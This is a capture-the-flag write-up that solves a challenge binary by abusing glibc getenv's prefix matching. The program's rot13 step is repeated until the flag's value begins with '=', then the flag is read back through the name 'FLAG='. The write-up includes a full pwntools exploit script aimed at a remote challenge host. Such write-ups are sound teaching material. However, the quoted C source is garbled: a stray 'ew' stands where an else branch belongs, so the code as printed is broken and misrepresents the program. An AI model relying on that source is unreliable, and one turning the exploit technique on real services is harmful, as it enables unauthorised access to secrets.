# Protect the Environment &mdash; Solution

The provided binary accepts commands to either "protect" (by `rot13`) or "print" environment variables. The flag is stored in an environment variable named `FLAG`, and direct access to it is blocked by the program logic.

```c
void rot13(char *s) {
  while (*s != 0) {
    *s += 13;
    s++;
  }
}

int main(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  char command[64];
  char name[64];

  while (1) {
    printf("> ");
    scanf("%63s %63s", command, name);
    if (!strcmp(command, "protect")) {
      char *val = getenv(name);
      if (val) {
        rot13(val);
        printf("Protected %s\n", name);
      } else {
        printf("No such environment variable\n");
      }
    } else if (!strcmp(command, "print")) {
      if (!strcmp(name, "FLAG")) {
        printf("Access denied\n");ew
        char *val = getenv(name);
        if (val) {
          printf("%s=%s\n", name, val);
        } else {
          printf("No such environment variable\n");
        }
      }
    } else {
      printf("Unknown command\n");
      break ;
    }
  }
  return 0;
}
```

The code seems to have no obvious bugs that can be exploited. What is needed is to dig a bit into how exactly `setenv` and `getenv` work in libc.

The environment variables are stored on the stack as strings of the form *name*=*value*, and the `getenv` function runs through the list of strings looking for the *name*. However, the [source code](https://github.com/bminor/glibc/blob/glibc-2.42/stdlib/getenv.c) of `getenv` reveals that a logic for matching the variable name is a bit unusual.
```c
      size_t len = strlen (name);
      for (char **ep = start_environ; ; ++ep)
	{
	  char *entry = atomic_load_relaxed (ep);
	  if (entry == NULL)
	    break;

	  /* If there is a match, return that value.  It was valid at
	     one point, so we can return it.  */
	  if (name[0] == entry[0]
	      && strncmp (name, entry, len) == 0 && entry[len] == '=')
	    return entry + len + 1;
	}
```

The *name* will match the string *entry* if it starts with *name* followed by the `=` character. This means that if the variable's value contains a `=`, it can be accessed using a crafted name. For example, if the entry is `FLAG=ab=c`, then `getenv("FLAG=ab")` will match that entry and return `"c"`.

The game plan is to apply rot13 to the FLAG variable until its value contains a `=`, allowing you to access the flag using a modified environment variable name. Since we know the FLAG starts with `FortID`, we can rot13 until the first character `F` becomes `=`, then query for the corresponding environment variable name `FLAG=`.

Putting it all together:
```python
#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 33121)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            continue
        ''')
    return p

def find_num(c):
    i = 0
    while c != ord('='):
        c = (c + 13) % 256
        i += 1
    return i;

def unrot13(s, k):
    return bytes(((i - k*13) % 256 + 256) % 256 for i in s)

p = conn()
x = find_num(ord('F'))
for i in range(x):
    p.sendlineafter(b'> ', b'protect FLAG')
p.sendlineafter(b'> ', b'print FLAG=')
p.recvuntil(b'FLAG=')
data = p.recvuntil(b'\n> ')[:-2]
print([data])
flag=unrot13(data, x)
print(flag)
p.close()
```
